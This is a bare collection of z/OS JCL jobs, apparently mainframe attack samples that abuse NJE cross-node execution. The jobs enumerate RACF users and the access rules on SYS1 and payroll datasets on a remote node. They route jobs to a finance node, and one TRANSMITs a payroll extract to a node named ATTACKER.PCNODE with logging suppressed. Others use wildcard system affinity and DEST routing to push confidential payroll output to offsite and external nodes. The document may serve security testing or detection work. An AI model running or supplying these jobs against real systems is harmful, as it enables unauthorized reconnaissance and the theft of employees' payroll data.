

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//NJEXEQ01 JOB (1234567),'NJE CROSS NODE',CLASS=A,
//             MSGLEVEL=(0,0),             
//             NOTIFY=&SYSUID
/*XEQ REMNODE1                          
//TSOCMD   EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSOUT   DD SYSOUT=*
//SYSTSIN  DD *
  LU                                      /* Enumerate users at REMNODE1 */
  LISTDSD DATASET('SYS1.**') GENERIC AUTH
  LISTDSD DATASET('PAYROLL.**') GENERIC AUTH
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//NJEROUTE JOB (1234567),'NJE ROUTE',CLASS=A,NOTIFY=&SYSUID
/*ROUTE XEQ FINNODE.FINUSER            
//ENUM     EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  LISTDS 'SYS1.PARMLIB'
  TIME
/*
/*ROUTE PRINT ORIGNODE.ORIGUSER         /* Return output to sender */

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//NJEXMIT  JOB (1234567),'NJE XMIT DATA',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  TRANSMIT ATTACKER.PCNODE          
  DATASET('PAYROLL.MONTHLY.EXTRACT')
  NOLOG
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//SYSAFF01 JOB (1234567),'SYSAFF WILDCARD',CLASS=A,NOTIFY=&SYSUID
/*JOBPARM SYSAFF=*                       
//STEP010  EXEC PGM=SENSITIV,REGION=4096K
//SYSPRINT DD SYSOUT=*
//SENSIN   DD DISP=SHR,DSN=PAYROLL.CONFIDENTIAL.DATA
//SENSOUT  DD SYSOUT=*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//DESTXMIT JOB (1234567),'DEST XMIT',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=PAYRPT
//SYSPRINT DD SYSOUT=*
//PAYROLL  DD SYSOUT=(A,,),
//            DEST=OFFSITE                
//         DD SYSOUT=A,
//            DEST=EXTNODE.EXTUSER        


